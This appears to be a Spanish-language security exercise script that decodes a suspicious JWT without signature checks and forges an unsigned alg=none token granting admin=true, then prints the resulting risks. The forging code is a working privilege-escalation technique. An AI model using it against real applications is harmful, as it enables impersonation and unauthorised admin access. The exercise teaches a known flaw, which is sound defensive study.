# ejercicio6.py
import jwt
import base64
import json

# 1. Leer el token del archivo
with open('token_sospechoso.txt', 'r') as f:
    token = f.read().strip()

print("=== TOKEN ORIGINAL ===")
print(token)
print()

# 2. Decodificar SIN verificar la firma (porque alg=none)
# Opción A: con PyJWT (recomendado)
try:
    payload = jwt.decode(token, options={"verify_signature": False}, algorithms=["none"])
    print("=== PAYLOAD DECODIFICADO (con PyJWT) ===")
    print(json.dumps(payload, indent=2))
except Exception as e:
    print("Error al decodificar con PyJWT:", e)
    # Si falla, usamos base64 manual
    print("\nIntentando decodificar manualmente con base64...")
    parts = token.split('.')
    if len(parts) >= 2:
        header_b64 = parts[0]
        payload_b64 = parts[1]
        # Añadir padding si falta
        header_b64 += '=' * (-len(header_b64) % 4)
        payload_b64 += '=' * (-len(payload_b64) % 4)
        header_json = base64.urlsafe_b64decode(header_b64).decode('utf-8')
        payload_json = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
        print("Header:", header_json)
        print("Payload:", payload_json)

print("\n" + "="*50)

# 3. Construir un JWT con admin=true (sin firma, alg=none)
payload_modificado = {
    "user_id": 42,
    "admin": True
}

# Codificamos con alg=none
token_modificado = jwt.encode(payload_modificado, key=None, algorithm='none')

print("\n=== TOKEN MODIFICADO (admin=true) ===")
print(token_modificado)

# 4. Verificar que se puede decodificar (sin verificación)
payload_dec = jwt.decode(token_modificado, options={"verify_signature": False}, algorithms=["none"])
print("\n=== PAYLOAD DEL TOKEN MODIFICADO ===")
print(json.dumps(payload_dec, indent=2))

print("\n🔴 IMPLICACIONES DE SEGURIDAD:")
print("  - Cualquier atacante puede forjar tokens de administrador sin necesidad de conocer la clave secreta.")
print("  - El sistema no verifica la integridad ni autenticidad del token.")
print("  - Un atacante podría suplantar a cualquier usuario (cambiando 'user_id') y obtener permisos de administrador.")
print("  - Esto anula completamente el control de acceso basado en roles.")
